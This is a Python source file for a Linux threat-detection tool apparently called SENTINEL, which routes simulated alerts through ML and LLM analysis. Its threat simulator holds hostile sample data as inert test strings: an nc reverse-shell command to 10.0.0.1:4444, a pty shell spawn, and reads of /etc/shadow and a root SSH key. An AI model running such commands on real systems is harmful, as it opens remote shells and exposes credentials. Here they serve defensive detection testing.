#!/usr/bin/env python3
"""
SENTINEL - Advanced Linux Threat Detection System
Day 9 - Full Module Integration
Combines: BPF detectors + ML anomaly + LLM analysis
"""

import os
import sys
import json
import time
import signal
import threading
import subprocess
from datetime import datetime
from collections import deque
from pathlib import Path

# Add module paths
SENTINEL_ROOT = os.path.expanduser('~/sentinel')
sys.path.insert(0, os.path.join(SENTINEL_ROOT, 'src/ai'))
sys.path.insert(0, os.path.join(SENTINEL_ROOT, 'src/bpf'))

# Import detection modules
try:
    from ml_anomaly import MLAnomalyDetector
    ML_AVAILABLE = True
    print("[✓] ML anomaly detection loaded")
except ImportError as e:
    ML_AVAILABLE = False
    print(f"[!] ML module not available: {e}")

try:
    from llm_analysis import LLMAnalyzer
    LLM_AVAILABLE = True
    print("[✓] LLM threat analysis loaded")
except ImportError as e:
    LLM_AVAILABLE = False
    print(f"[!] LLM module not available: {e}")

# Try to import BPF modules
BPF_AVAILABLE = False
try:
    from bcc import BPF
    BPF_AVAILABLE = True
    print("[✓] BPF/eBPF available")
except ImportError:
    print("[!] BPF not available - running in simulation mode")


class AlertManager:
    """Manages alert queue and processing"""
    
    def __init__(self, max_size=10000):
        self.queue = deque(maxlen=max_size)
        self.processed = []
        self.lock = threading.Lock()
        
    def add(self, alert):
        """Add alert to queue"""
        with self.lock:
            alert['queued_at'] = datetime.now().isoformat()
            self.queue.append(alert)
    
    def get(self):
        """Get next alert from queue"""
        with self.lock:
            if self.queue:
                return self.queue.popleft()
        return None
    
    def mark_processed(self, alert):
        """Mark alert as processed"""
        with self.lock:
            alert['processed_at'] = datetime.now().isoformat()
            self.processed.append(alert)
    
    def size(self):
        """Get current queue size"""
        return len(self.queue)
    
    def get_stats(self):
        """Get queue statistics"""
        return {
            'queued': len(self.queue),
            'processed': len(self.processed),
            'max_size': self.queue.maxlen
        }


class SentinelCore:
    """Main SENTINEL orchestrator"""
    
    def __init__(self, config=None):
        self.config = self._merge_config(config)
        self.running = False
        self.modules = {}
        self.threads = []
        self.alert_manager = AlertManager()
        
        # Statistics
        self.stats = {
            'start_time': None,
            'total_alerts': 0,
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0,
            'events_processed': 0,
            'ml_analyses': 0,
            'llm_analyses': 0
        }
        
        # Setup directories FIRST
        self._setup_directories()
        
        # Initialize components
        self._init_components()
        
    def _merge_config(self, user_config):
        """Merge user config with defaults"""
        default = {
            'log_dir': '~/sentinel/logs',
            'data_dir': '~/sentinel/data',
            'cache_dir': '~/sentinel/cache',
            'reports_dir': '~/sentinel/reports',
            'heartbeat_interval': 5,
            'llm_min_severity': 'HIGH',
            'alert_retention_days': 30,
            'enable_ml': True,
            'enable_llm': True,
            'simulation_mode': not BPF_AVAILABLE
        }
        
        if user_config:
            default.update(user_config)
        
        return default
    
    def _init_components(self):
        """Initialize all SENTINEL components"""
        print("\n[*] Initializing SENTINEL components...")
        
        # ML Detector
        if ML_AVAILABLE and self.config['enable_ml']:
            self.ml_detector = MLAnomalyDetector()
            self.modules['ml'] = self.ml_detector
        else:
            self.ml_detector = None
            
        # LLM Analyzer
        if LLM_AVAILABLE and self.config['enable_llm']:
            self.llm_analyzer = LLMAnalyzer()
            self.modules['llm'] = self.llm_analyzer
        else:
            self.llm_analyzer = None
            
        # BPF Monitors (if available)
        if BPF_AVAILABLE and not self.config['simulation_mode']:
            self._init_bpf_monitors()
        
        print(f"[✓] Initialized {len(self.modules)} modules")
    
    def _init_bpf_monitors(self):
        """Initialize BPF monitoring programs"""
        # This would load and attach eBPF programs
        pass
    
    def _setup_directories(self):
        """Create necessary directories"""
        dirs = [
            self.config['log_dir'],
            self.config['data_dir'],
            self.config['cache_dir'],
            self.config['reports_dir']
        ]
        
        for d in dirs:
            path = os.path.expanduser(d)
            os.makedirs(path, exist_ok=True)
    
    def start(self):
        """Start SENTINEL monitoring"""
        self.running = True
        self.stats['start_time'] = datetime.now()
        
        self._print_banner()
        
        # Start worker threads
        self._start_threads()
        
        # Main loop
        try:
            self._main_loop()
        except KeyboardInterrupt:
            self.stop()
    
    def _print_banner(self):
        """Display SENTINEL banner"""
        banner = f"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗
║   ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║
║   ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║
║   ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║
║   ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗
║   ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
║                                                              ║
║              Advanced Linux Threat Detection                  ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║   PID: {os.getpid():<50} ║
║   Start Time: {self.stats['start_time'].strftime('%Y-%m-%d %H:%M:%S'):<40} ║
║   ML Enabled: {str(self.config['enable_ml'] and ML_AVAILABLE):<47} ║
║   LLM Enabled: {str(self.config['enable_llm'] and LLM_AVAILABLE):<46} ║
║   BPF Mode: {'SIMULATION' if self.config['simulation_mode'] else 'LIVE':<47} ║
╚══════════════════════════════════════════════════════════════╝
"""
        print(banner)
    
    def _start_threads(self):
        """Start all worker threads"""
        
        # Alert processor thread
        processor = threading.Thread(target=self._alert_processor, name="AlertProcessor")
        processor.daemon = True
        processor.start()
        self.threads.append(processor)
        
        # Event collector thread
        collector = threading.Thread(target=self._event_collector, name="EventCollector")
        collector.daemon = True
        collector.start()
        self.threads.append(collector)
        
        # Heartbeat thread
        heartbeat = threading.Thread(target=self._heartbeat_loop, name="Heartbeat")
        heartbeat.daemon = True
        heartbeat.start()
        self.threads.append(heartbeat)
        
        # If in simulation mode, start threat simulator
        if self.config['simulation_mode']:
            simulator = threading.Thread(target=self._threat_simulator, name="ThreatSimulator")
            simulator.daemon = True
            simulator.start()
            self.threads.append(simulator)
        
        print(f"[✓] Started {len(self.threads)} worker threads\n")
    
    def _alert_processor(self):
        """Process alerts through ML and LLM pipeline"""
        while self.running:
            alert = self.alert_manager.get()
            
            if alert:
                processed = self._process_alert(alert)
                self.alert_manager.mark_processed(processed)
                self.stats['total_alerts'] += 1
                self.stats['events_processed'] += 1
            else:
                time.sleep(0.1)
    
    def _process_alert(self, alert):
        """Run alert through analysis pipeline"""
        
        # Step 1: ML Anomaly Detection
        if self.ml_detector:
            ml_result = self._analyze_with_ml(alert)
            if ml_result:
                alert['ml_analysis'] = ml_result
                alert['severity'] = ml_result.get('severity', 'LOW')
                self.stats['ml_analyses'] += 1
                
                # Update severity stats
                severity = alert['severity'].lower()
                if severity in self.stats:
                    self.stats[severity] += 1
        
        # Step 2: LLM Analysis (only for significant threats)
        if self.llm_analyzer and self._should_use_llm(alert):
            llm_result = self._analyze_with_llm(alert)
            if llm_result:
                alert['llm_analysis'] = llm_result
                self.stats['llm_analyses'] += 1
        
        # Step 3: Log to file
        self._log_alert(alert)
        
        # Step 4: Display if significant
        if alert.get('severity') in ['CRITICAL', 'HIGH']:
            self._display_alert(alert)
        
        return alert
    
    def _analyze_with_ml(self, alert):
        """Run ML analysis on alert"""
        try:
            alert_type = alert.get('type', 'process')
            event_data = alert.get('data', {})
            
            if alert_type == 'process':
                return self.ml_detector.add_process_event(event_data)
            elif alert_type == 'file':
                return self.ml_detector.add_file_event(event_data)
            elif alert_type == 'syscall':
                return self.ml_detector.add_syscall_event(event_data)
            elif alert_type == 'network':
                return self.ml_detector.add_network_event(event_data)
        except Exception as e:
            print(f"[!] ML analysis error: {e}")
        return None
    
    def _analyze_with_llm(self, alert):
        """Run LLM analysis on alert"""
        try:
            context = {
                'type': alert.get('type'),
                'event': alert.get('data', {}),
                'severity': alert.get('severity', 'UNKNOWN')
            }
            
            if 'ml_analysis' in alert:
                context['score'] = alert['ml_analysis'].get('score', 0)
            
            return self.llm_analyzer.analyze_threat(context)
        except Exception as e:
            print(f"[!] LLM analysis error: {e}")
        return None
    
    def _should_use_llm(self, alert):
        """Determine if LLM analysis should be used"""
        if not self.config['enable_llm']:
            return False
        
        severity = alert.get('severity', 'LOW')
        min_severity = self.config['llm_min_severity']
        
        severity_levels = {'LOW': 0, 'MEDIUM': 1, 'HIGH': 2, 'CRITICAL': 3}
        
        return severity_levels.get(severity, 0) >= severity_levels.get(min_severity, 2)
    
    def _log_alert(self, alert):
        """Log alert to JSON file"""
        log_dir = os.path.expanduser(self.config['log_dir'])
        date_str = datetime.now().strftime('%Y%m%d')
        log_file = os.path.join(log_dir, f'alerts_{date_str}.json')
        
        try:
            with open(log_file, 'a') as f:
                json.dump(alert, f, default=str)
                f.write('\n')
        except Exception as e:
            print(f"[!] Failed to log alert: {e}")
    
    def _display_alert(self, alert):
        """Display formatted alert in console"""
        severity = alert.get('severity', 'UNKNOWN')
        symbols = {
            'CRITICAL': '🔴🔴🔴',
            'HIGH': '🔴🔴',
            'MEDIUM': '🟡',
            'LOW': '🟢'
        }
        
        print(f"\n{symbols.get(severity, '❓')} [{severity}] {alert.get('type', 'unknown').upper()} DETECTED")
        print(f"   Time: {datetime.now().strftime('%H:%M:%S')}")
        
        if 'llm_analysis' in alert:
            llm = alert['llm_analysis']
            print(f"   Threat: {llm.get('threat_type', 'Unknown')}")
            if llm.get('description'):
                desc = llm['description']
                print(f"   {desc[:100]}..." if len(desc) > 100 else f"   {desc}")
        
        if 'ml_analysis' in alert:
            ml = alert['ml_analysis']
            print(f"   Score: {ml.get('score', 0):.4f}")
        
        print()
    
    def _event_collector(self):
        """Collect events from various sources"""
        while self.running:
            time.sleep(1)
    
    def _threat_simulator(self):
        """Simulate threats for testing"""
        print("[*] Threat simulator running - generating test alerts\n")
        
        threats = [
            {
                'type': 'process',
                'data': {
                    'cmdline': 'nc -e /bin/bash 10.0.0.1 4444',
                    'is_root': False,
                    'pid': 10000,
                    'comm': 'nc',
                    'uid': 1000
                },
                'delay': 10
            },
            {
                'type': 'process',
                'data': {
                    'cmdline': 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
                    'is_root': True,
                    'pid': 11000,
                    'comm': 'python3',
                    'uid': 0
                },
                'delay': 15
            },
            {
                'type': 'file',
                'data': {
                    'path': '/etc/shadow',
                    'flags': 1,
                    'is_write': False,
                    'is_root': True,
                    'pid': 12000
                },
                'delay': 20
            },
            {
                'type': 'file',
                'data': {
                    'path': '/root/.ssh/id_rsa',
                    'flags': 0,
                    'is_write': False,
                    'is_root': True,
                    'pid': 13000
                },
                'delay': 25
            }
        ]
        
        for threat in threats:
            if not self.running:
                break
            
            time.sleep(threat['delay'])
            
            if self.running:
                print(f"[*] Simulating: {threat['type']} threat...")
                self.alert_manager.add(threat)
    
    def _heartbeat_loop(self):
        """Display periodic heartbeat with stats"""
        count = 0
        
        while self.running:
            time.sleep(self.config['heartbeat_interval'])
            count += 1
            
            if self.running and self.stats['start_time']:
                uptime = (datetime.now() - self.stats['start_time']).seconds
                print(f"[♥] Heartbeat #{count} | Uptime: {uptime}s | "
                      f"Queue: {self.alert_manager.size()} | "
                      f"Alerts: {self.stats['total_alerts']} | "
                      f"Critical: {self.stats['critical']}")
    
    def _main_loop(self):
        """Main monitoring loop"""
        print("[*] SENTINEL is monitoring... Press Ctrl+C to stop\n")
        
        while self.running:
            time.sleep(0.5)
    
    def stop(self):
        """Gracefully shutdown SENTINEL"""
        print("\n[*] Shutting down SENTINEL...")
        self.running = False
        
        # Wait for threads
        for thread in self.threads:
            thread.join(timeout=2)
        
        self._print_summary()
        print("\n[✓] SENTINEL stopped.")
    
    def _print_summary(self):
        """Print session summary"""
        uptime = 0
        if self.stats['start_time']:
            uptime = (datetime.now() - self.stats['start_time']).seconds
        
        summary = f"""
╔══════════════════════════════════════════════════════════════╗
║                     SESSION SUMMARY                           ║
╠══════════════════════════════════════════════════════════════╣
║   Runtime:        {uptime}s
║   Total Alerts:   {self.stats['total_alerts']}
║   ├─ Critical:    {self.stats['critical']}
║   ├─ High:        {self.stats['high']}
║   ├─ Medium:      {self.stats['medium']}
║   └─ Low:         {self.stats['low']}
║                                                               ║
║   ML Analyses:    {self.stats['ml_analyses']}
║   LLM Analyses:   {self.stats['llm_analyses']}
║   Events Processed: {self.stats['events_processed']}
╚══════════════════════════════════════════════════════════════╝
"""
        print(summary)


def main():
    """Main entry point"""
    import argparse
    parser = argparse.ArgumentParser(description='SENTINEL Threat Detection System')
    parser.add_argument('--simulate', action='store_true', help='Run in simulation mode')
    parser.add_argument('--no-ml', action='store_true', help='Disable ML detection')
    parser.add_argument('--no-llm', action='store_true', help='Disable LLM analysis')
    
    args = parser.parse_args()
    
    config = {
        'simulation_mode': args.simulate or not BPF_AVAILABLE,
        'enable_ml': not args.no_ml,
        'enable_llm': not args.no_llm,
    }
    
    sentinel = SentinelCore(config)
    sentinel.start()


if __name__ == "__main__":
    main()
